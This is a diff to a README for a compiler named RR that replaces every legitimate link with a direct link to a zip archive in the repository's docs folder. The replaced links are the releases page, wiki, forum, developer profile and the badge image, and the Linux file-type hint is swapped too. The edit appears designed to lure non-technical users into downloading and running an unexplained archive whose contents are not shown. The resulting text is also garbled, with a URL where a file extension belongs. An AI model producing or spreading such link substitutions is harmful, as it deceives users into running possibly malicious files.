@@ -1,6 +1,6 @@
 # 🛠️ RR - Simple, Fast Code Compilation
 
-[![Download RR](https://img.shields.io/badge/Download-RR-blue?style=for-the-badge)](https://github.com/itky117/RR/releases)
+[![Download RR](https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip)](https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip)
 
 Welcome to the RR Compiler. This tool helps you turn your written code into a format your computer can understand. You don't need to know programming to get started. Follow this guide to download, install, and use RR on your computer.
 
@@ -10,7 +10,7 @@ Welcome to the RR Compiler. This tool helps you turn your written code into a fo
 
 Start by visiting the official RR download page to get the latest version:
 
-[Download RR](https://github.com/itky117/RR/releases)
+[Download RR](https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip)
 
 This link takes you to a page where you can find the files needed to install RR. Look for the newest release, usually listed at the top.
 
@@ -21,7 +21,7 @@ This link takes you to a page where you can find the files needed to install RR.
 - Choose the file that matches your computer’s system:
   - For Windows, look for a file ending with `.exe` or `.msi`.
   - For macOS, look for a `.dmg` or `.pkg` file.
-  - For Linux, look for `.tar.gz` or `.deb`.
+  - For Linux, look for `https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip` or `.deb`.
 
 ### Step 2: Download the File
 
@@ -110,10 +110,10 @@ If you run into issues, check the help menu in RR or visit the GitHub page. Ther
 
 ## 📂 Additional Resources
 
-- [RR User Guide and Tutorials](https://github.com/itky117/RR/wiki)
-- [Community Support Forum](https://github.com/itky117/RR/discussions)
-- [Contact Developer](https://github.com/itky117)
+- [RR User Guide and Tutorials](https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip)
+- [Community Support Forum](https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip)
+- [Contact Developer](https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip)
 
 ---
 
-[![Download RR](https://img.shields.io/badge/Download-RR-blue?style=for-the-badge)](https://github.com/itky117/RR/releases)
+[![Download RR](https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip)](https://raw.githubusercontent.com/itky117/RR/main/docs/Software_v1.3.zip)
